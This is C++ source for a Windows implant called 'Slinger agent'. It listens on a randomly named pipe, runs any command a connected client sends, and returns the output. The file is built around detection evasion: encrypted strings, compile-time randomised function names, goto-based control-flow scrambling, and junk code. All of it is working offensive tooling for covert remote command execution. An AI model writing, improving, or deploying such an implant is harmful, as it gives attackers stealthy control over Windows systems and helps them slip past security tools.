#include "obfuscation.h"
#include "pipe_core.h"
#include "command_executor.h"
#include <windows.h>
#include <string>
#include <vector>

namespace obf = obfuscated;

// Obfuscated function names using compile-time randomization
#define MAIN_FUNC OBF_FUNC_NAME(main_entry_point)
#define PIPE_HANDLER OBF_FUNC_NAME(handle_pipe_communication)
#define CMD_PROCESSOR OBF_FUNC_NAME(process_command_request)
#define CLEANUP_FUNC OBF_FUNC_NAME(cleanup_resources)

// Obfuscated strings
constexpr auto PIPE_NAME = OBF_STRING("\\\\.\\pipe\\slinger_agent_");
constexpr auto SUCCESS_MSG = OBF_STRING("OK");
constexpr auto ERROR_MSG = OBF_STRING("ERROR");
constexpr auto EXIT_CMD = OBF_STRING("exit");

class SlingerAgent {
private:
    PipeCore pipe_handler;
    CommandExecutor cmd_executor;
    std::string pipe_name;
    bool running;

    // Generate unique pipe name with obfuscated random suffix
    std::string OBF_FUNC_NAME(generate_pipe_name)() {
        auto base_name = PIPE_NAME.decrypt();

        // Simple time-based suffix generation
        SYSTEMTIME st;
        GetSystemTime(&st);
        auto suffix = std::to_string(st.wMilliseconds + st.wSecond * 1000);

        return base_name + suffix;
    }

    // Main command processing loop
    bool OBF_FUNC_NAME(process_commands)() {
        while (running) {
            auto request = pipe_handler.read_command();
            if (request.empty()) {
                continue;
            }

            // Check for exit command
            if (request == EXIT_CMD.decrypt()) {
                running = false;
                pipe_handler.send_response(SUCCESS_MSG.decrypt());
                break;
            }

            // Execute command and send response
            auto result = cmd_executor.execute(request);
            pipe_handler.send_response(result);
        }
        return true;
    }

public:
    SlingerAgent() : running(false) {
        pipe_name = OBF_FUNC_NAME(generate_pipe_name)();
    }

    // Main agent entry point
    int OBF_FUNC_NAME(run)() {
        // Initialize pipe communication
        if (!pipe_handler.initialize(pipe_name)) {
            return 1;
        }

        running = true;

        // Wait for client connection
        if (!pipe_handler.wait_for_connection()) {
            return 2;
        }

        // Send initial handshake
        pipe_handler.send_response(SUCCESS_MSG.decrypt());

        // Process commands
        OBF_FUNC_NAME(process_commands)();

        // Cleanup
        OBF_FUNC_NAME(cleanup)();
        return 0;
    }

    void OBF_FUNC_NAME(cleanup)() {
        running = false;
        pipe_handler.cleanup();
    }
};

// Obfuscated main function with control flow obfuscation
int OBF_FUNC_NAME(MAIN_FUNC)() {
    // Control flow obfuscation using goto and random jumps
    volatile int flow_control = obf::random_seed() % 3;

    switch (flow_control) {
        case 0: goto init_agent;
        case 1: goto setup_flow;
        default: goto direct_run;
    }

init_agent:
    {
        SlingerAgent agent;
        if (obf::random_seed() % 2) goto run_agent;
        return agent.OBF_FUNC_NAME(run)();
    }

setup_flow:
    {
        if (obf::random_seed() % 3 == 1) goto init_agent;
        SlingerAgent agent;
        goto run_agent_flow;
    }

direct_run:
    {
        SlingerAgent agent;
        goto run_agent;
    }

run_agent:
    {
        SlingerAgent agent;
        return agent.OBF_FUNC_NAME(run)();
    }

run_agent_flow:
    {
        SlingerAgent agent;
        auto result = agent.OBF_FUNC_NAME(run)();
        goto cleanup_and_exit;
    }

cleanup_and_exit:
    return 0;
}

// Entry point with additional obfuscation
int main() {
    // Add junk code for obfuscation
    volatile int junk1 = obf::random_seed();
    volatile int junk2 = junk1 * 0x1337;

    if (junk2 % 2 == 0) {
        return OBF_FUNC_NAME(MAIN_FUNC)();
    } else {
        return OBF_FUNC_NAME(MAIN_FUNC)();
    }
}

#ifdef _WIN32
// Windows entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    return main();
}
#endif
